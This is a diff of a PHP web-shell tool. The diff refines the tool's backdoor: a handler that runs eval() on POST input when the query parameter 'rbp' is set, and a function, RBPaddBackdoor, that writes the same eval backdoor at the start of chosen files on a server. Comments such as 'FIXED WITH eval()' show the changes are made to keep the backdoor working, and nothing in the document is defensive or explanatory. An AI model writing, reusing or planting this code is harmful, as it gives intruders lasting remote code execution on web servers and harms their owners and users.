@@ -230,7 +230,7 @@ function RBPaddBackdoor($filePath, $backdoorCode) {
     }
     
     // Add backdoor code at the beginning for better execution
-    $newContent = "<?php if(isset(\$_GET['rbp']) && \$_GET['rbp']=='rbp'){if(isset(\$_POST['rbp'])){eval(\$_POST['rbp']);exit;}} ?>" . $originalContent;
+   $newContent = "<?php if(isset(\$_GET['rbp'])&&\$_GET['rbp']=='rbp'){if(isset(\$_POST['rbp'])){@eval(\$_POST['rbp']);exit();}}?>" . $originalContent;
     
     if (file_put_contents($filePath, $newContent)) {
         return ["success" => "Backdoor added successfully to: $filePath"];
@@ -627,15 +627,15 @@ if (isset($_POST['mass_delete'])) {
     exit;
 }
 
-// Backdoor execution - ULTRA FIXED
-if(isset($_GET['rbp']) && $_GET['rbp'] == 'rbp'){
+// Backdoor execution - FIXED
+if(isset($_GET['rbp'])&&$_GET['rbp']=='rbp'){
     if(isset($_POST['rbp'])){
         @eval($_POST['rbp']);
         exit();
     }
 }
 
-// Add backdoor to file - ULTRA FIXED
+// Add backdoor to file - FIXED
 function RBPaddBackdoor($filePath, $backdoorCode) {
     if (!file_exists($filePath)) {
         return ["error" => "File not found: $filePath"];
@@ -655,8 +655,8 @@ function RBPaddBackdoor($filePath, $backdoorCode) {
     $cleanContent = preg_replace('/^<\?php\s*/', '', $originalContent);
     $cleanContent = preg_replace('/^<\?\s*/', '', $cleanContent);
     
-    // Add backdoor code at the VERY beginning
-    $newContent = "<?php if(isset(\$_GET['rbp'])&&\$_GET['rbp']=='rbp'){if(isset(\$_POST['rbp'])){@eval(\$_POST['rbp']);exit;}}?>" . $cleanContent;
+    // Add backdoor code at the VERY beginning - FIXED WITH eval()
+    $newContent = "<?php if(isset(\$_GET['rbp'])&&\$_GET['rbp']=='rbp'){if(isset(\$_POST['rbp'])){@eval(\$_POST['rbp']);exit();}}?>" . $cleanContent;
     
     if (file_put_contents($filePath, $newContent)) {
         return ["success" => "Backdoor added successfully to: $filePath"];
@@ -665,7 +665,7 @@ function RBPaddBackdoor($filePath, $backdoorCode) {
     }
 }
 
-// Backdoor handler - ULTRA FIXED
+// Backdoor handler - FIXED
 if (isset($_POST['add_backdoor'])) {
     $isPostAction = true;
     $sourceFile = $_POST['backdoor_file_path'] ?? '';
@@ -676,8 +676,8 @@ if (isset($_POST['add_backdoor'])) {
         exit;
     }
     
-    // Ultra fixed backdoor code - minimal, at beginning
-    $backdoorCode = "<?php if(isset(\$_GET['rbp'])&&\$_GET['rbp']=='rbp'){if(isset(\$_POST['rbp'])){@eval(\$_POST['rbp']);exit;}}?>";
+    // FIXED backdoor code with eval() not trim()
+    $backdoorCode = "<?php if(isset(\$_GET['rbp'])&&\$_GET['rbp']=='rbp'){if(isset(\$_POST['rbp'])){@eval(\$_POST['rbp']);exit();}}?>";
     
     $results = RBPaddBackdoor($sourceFile, $backdoorCode);
     $_SESSION['backdoor_results'] = $results;
